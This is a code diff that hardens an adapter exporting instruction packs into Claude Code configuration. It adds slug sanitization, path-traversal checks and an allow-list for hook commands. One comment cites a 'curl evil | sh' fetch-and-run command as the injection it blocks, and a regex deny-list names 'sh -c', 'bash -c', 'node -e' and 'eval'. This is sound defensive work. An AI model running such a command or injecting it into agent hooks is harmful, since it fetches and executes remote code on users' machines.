@@ -1,3 +1,6 @@
+import * as fs from "node:fs/promises";
+import * as path from "node:path";
+import { parse as parseYaml } from "yaml";
 import type {
   AdapterExportOptions,
   AdapterOutputFile,
@@ -12,6 +15,13 @@ import {
   wrapInstructionBlock,
 } from "./types.js";
 
+function slugFor(atom: Atom): string {
+  // The atom-id regex guarantees a single `:`-separated slug component with
+  // no path separators. Strip any defense-in-depth metacharacters anyway.
+  const raw = atom.id.split(":")[1] ?? atom.name;
+  return raw.replace(/[^a-zA-Z0-9._-]/g, "_");
+}
+
 function renderInstructionBody(
   atom: Atom,
   body: string | null,
@@ -23,6 +33,47 @@ function renderRuleSection(atom: Atom): string {
   return `### Rule: ${atom.name}\n\n_(${atom.id})_\n\n${atom.description.trim()}\n`;
 }
 
+interface ParsedYaml {
+  [key: string]: unknown;
+}
+
+async function parseAtomYaml(
+  packRoot: string,
+  atom: Atom,
+): Promise<ParsedYaml | null> {
+  const raw = await readAtomFile(packRoot, atom);
+  if (!raw) return null;
+  try {
+    const parsed = parseYaml(raw) as unknown;
+    if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
+      return parsed as ParsedYaml;
+    }
+    return null;
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * Allow-list check for hook command strings. A hook command may either:
+ *  - Match exactly one of the pack-level `permissions.shell.commands`
+ *    declarations (verbatim string match).
+ *  - Be a single-token command (no spaces, no shell metacharacters), in
+ *    which case it must still appear in the allow-list or we refuse.
+ *
+ * This prevents a malicious pack from injecting `curl evil | sh` into the
+ * generated `.claude/settings.json` hooks block.
+ */
+function isHookCommandAllowed(command: string, allowed: string[]): boolean {
+  if (!command) return false;
+  // Reject obviously dangerous shells outright even if allow-listed —
+  // matching `sh -c …` exactly is too easy to slip past review.
+  if (/\bsh\s+-c\b|\bbash\s+-c\b|\bnode\s+-e\b|\beval\b/i.test(command)) {
+    return false;
+  }
+  return allowed.includes(command);
+}
+
 export const claudeCodeAdapter = defineAdapter({
   target: "claude-code",
   async build(options: AdapterExportOptions) {
@@ -31,6 +82,8 @@ export const claudeCodeAdapter = defineAdapter({
     const warnings: string[] = [];
     const unsupported: string[] = [];
     const byType = atomsByType(resolvedAtoms);
+
+    const allowedShellCommands = manifest.permissions?.shell?.commands ?? [];
 
     // ---------- CLAUDE.md ----------
     const instructionAtoms = byType.get("instruction") ?? [];
@@ -75,7 +128,7 @@ export const claudeCodeAdapter = defineAdapter({
     // ---------- Skills ----------
     const skillAtoms = byType.get("skill") ?? [];
     for (const atom of skillAtoms) {
-      const slug = atom.id.split(":")[1] ?? atom.name;
+      const slug = slugFor(atom);
       const entries = await readAtomDirectory(packRoot, atom);
       if (entries.length === 0) {
         warnings.push(
@@ -100,18 +153,15 @@ export const claudeCodeAdapter = defineAdapter({
     // ---------- Commands (compile to skill-style folders) ----------
     const commandAtoms = byType.get("command") ?? [];
     for (const atom of commandAtoms) {
-      const slug = atom.id.split(":")[1] ?? atom.name;
-      const invocation = (atom as { invocation?: { slash?: string; cli?: string } })
-        .invocation;
-      const promptPath =
-        (atom as { path: string }).path && atom.path.endsWith(".md")
-          ? atom.path
-          : undefined;
-      let body = promptPath ? await readAtomFile(packRoot, atom) : null;
-      if (!body) {
-        // Try to find a prompt file referenced by the command yaml.
-        const promptFromYaml = await findCommandPrompt(packRoot, atom);
-        if (promptFromYaml) body = promptFromYaml;
+      const slug = slugFor(atom);
+      const parsed = await parseAtomYaml(packRoot, atom);
+      const invocation = parsed?.["invocation"] as
+        | { slash?: string; cli?: string }
+        | undefined;
+      let body: string | null = null;
+      const promptPath = parsed?.["prompt"];
+      if (typeof promptPath === "string" && promptPath.length > 0) {
+        body = await readPromptFile(packRoot, promptPath);
       }
       const header = `---\nname: ${slug}\ndescription: ${atom.description}\n---\n\n`;
       const slash = invocation?.slash ? `Invocation: \`${invocation.slash}\`\n\n` : "";
@@ -125,9 +175,12 @@ export const claudeCodeAdapter = defineAdapter({
     // ---------- Subagents ----------
     const subagentAtoms = byType.get("subagent") ?? [];
     for (const atom of subagentAtoms) {
-      const slug = atom.id.split(":")[1] ?? atom.name;
-      const raw = await readAtomFile(packRoot, atom);
-      const instructions = extractFieldFromYaml(raw, "instructions") ?? atom.description;
+      const slug = slugFor(atom);
+      const parsed = await parseAtomYaml(packRoot, atom);
+      const instructions =
+        typeof parsed?.["instructions"] === "string"
+          ? (parsed["instructions"] as string).trim()
+          : atom.description;
       files.push({
         path: `.claude/agents/${slug}.md`,
         content:
@@ -144,9 +197,23 @@ export const claudeCodeAdapter = defineAdapter({
       if (hookAtoms.length > 0) {
         const hooks: Record<string, unknown[]> = {};
         for (const atom of hookAtoms) {
+          const parsed = await parseAtomYaml(packRoot, atom);
           const events =
-            (atom as { lifecycle?: { events?: { "claude-code"?: string[] } } })
-              .lifecycle?.events?.["claude-code"] ?? ["PostToolUse"];
+            ((atom as { lifecycle?: { events?: { "claude-code"?: string[] } } })
+              .lifecycle?.events?.["claude-code"] ??
+              (parsed?.["events"] as { "claude-code"?: string[] } | undefined)
+                ?.["claude-code"] ??
+              ["PostToolUse"]) as string[];
+          const handler = (parsed?.["handler"] as { command?: string } | undefined)
+            ?? (atom as { handler?: { command?: string } }).handler;
+          const command = handler?.command ?? "";
+          if (!isHookCommandAllowed(command, allowedShellCommands)) {
+            warnings.push(
+              `Hook \`${atom.id}\` declares command \`${command || "(empty)"}\` which is NOT listed in \`permissions.shell.commands\`. Refusing to emit it into settings.json.`,
+            );
+            unsupported.push(atom.id);
+            continue;
+          }
           for (const evt of events) {
             const list = hooks[evt] ?? [];
             list.push({
@@ -154,9 +221,8 @@ export const claudeCodeAdapter = defineAdapter({
               hooks: [
                 {
                   type: "command",
-                  command: atomShellCommand(atom),
+                  command,
                   description: atom.description,
-                  // Surface risk in settings so users see it on inspection.
                   risk_level: atom.risk_level,
                   source_atom: atom.id,
                 },
@@ -165,7 +231,7 @@ export const claudeCodeAdapter = defineAdapter({
             hooks[evt] = list;
           }
         }
-        settings.hooks = hooks;
+        if (Object.keys(hooks).length > 0) settings.hooks = hooks;
         warnings.push(
           "Hook atom(s) installed — they run shell commands after agent edits. Review before enabling.",
         );
@@ -173,7 +239,7 @@ export const claudeCodeAdapter = defineAdapter({
       if (mcpAtoms.length > 0) {
         const mcpServers: Record<string, unknown> = {};
         for (const atom of mcpAtoms) {
-          const slug = atom.id.split(":")[1] ?? atom.name;
+          const slug = slugFor(atom);
           const a = atom as {
             transport?: string;
             command?: string;
@@ -197,16 +263,17 @@ export const claudeCodeAdapter = defineAdapter({
             `MCP server \`${atom.id}\` configured. Required env: ${Object.keys(a.env ?? {}).join(", ") || "(none)"}.`,
           );
         }
-        settings.mcpServers = mcpServers;
+        if (Object.keys(mcpServers).length > 0) settings.mcpServers = mcpServers;
       }
-      files.push({
-        path: ".claude/settings.json",
-        content: stableJsonStringify(settings),
-        action: "create",
-      });
+      if (Object.keys(settings).length > 0) {
+        files.push({
+          path: ".claude/settings.json",
+          content: stableJsonStringify(settings),
+          action: "create",
+        });
+      }
     }
 
-    // Unsupported / informational
     const supportedTypes = new Set([
       "instruction",
       "rule",
@@ -230,54 +297,29 @@ export const claudeCodeAdapter = defineAdapter({
   },
 });
 
-function atomShellCommand(atom: Atom): string {
-  // Best-effort: read the `handler.command` from the atom YAML body. We
-  // already attempted to read the file in readAtomFile, but here we fall
-  // back to atom.description if nothing else available.
-  return (atom as { handler?: { command?: string } }).handler?.command ?? "echo 'noop'";
-}
-
-function extractFieldFromYaml(raw: string | null, field: string): string | null {
-  if (!raw) return null;
-  // Tiny YAML field-extractor for `field: |\n  ...` blocks. Adapter outputs
-  // can use this without pulling in the YAML parser at every atom read.
-  const headerRegex = new RegExp(`^${field}:\\s*\\|\\s*\\n`, "m");
-  const match = headerRegex.exec(raw);
-  if (match) {
-    const start = match.index + match[0].length;
-    const lines = raw.slice(start).split("\n");
-    const body: string[] = [];
-    let indent: number | null = null;
-    for (const line of lines) {
-      if (line.trim() === "") {
-        body.push("");
-        continue;
-      }
-      const lineIndent = line.match(/^( +)/)?.[1]?.length ?? 0;
-      if (indent === null) indent = lineIndent;
-      if (lineIndent < (indent ?? 0)) break;
-      body.push(line.slice(indent ?? 0));
-    }
-    return body.join("\n").trim();
-  }
-  const inline = new RegExp(`^${field}:\\s*(.+)$`, "m").exec(raw);
-  if (inline) return inline[1]!.trim().replace(/^['"]|['"]$/g, "");
-  return null;
-}
-
-async function findCommandPrompt(
+async function readPromptFile(
   packRoot: string,
-  atom: Atom,
+  relPath: string,
 ): Promise<string | null> {
-  const raw = await readAtomFile(packRoot, atom);
-  if (!raw) return null;
-  const promptPath = /^prompt:\s*(.+)$/m.exec(raw)?.[1]?.trim();
-  if (!promptPath) return null;
-  const { readFile } = await import("node:fs/promises");
-  const path = await import("node:path");
-  try {
-    return await readFile(path.resolve(packRoot, promptPath), "utf8");
-  } catch {
+  // Containment: reject absolute paths and `..` traversal — same rules as
+  // atom.path. The prompt path is a manifest-controlled string referenced
+  // from an atom body file (yaml `prompt:` field), so the trust boundary is
+  // the same as the atom itself.
+  if (
+    path.isAbsolute(relPath) ||
+    relPath.startsWith("~") ||
+    relPath.split(/[\\/]+/).includes("..")
+  ) {
     return null;
+  }
+  const target = path.resolve(packRoot, relPath);
+  const rel = path.relative(packRoot, target);
+  if (rel.startsWith("..") || path.isAbsolute(rel)) return null;
+  try {
+    return await fs.readFile(target, "utf8");
+  } catch (err) {
+    const e = err as NodeJS.ErrnoException;
+    if (e.code === "ENOENT") return null;
+    throw err;
   }
 }
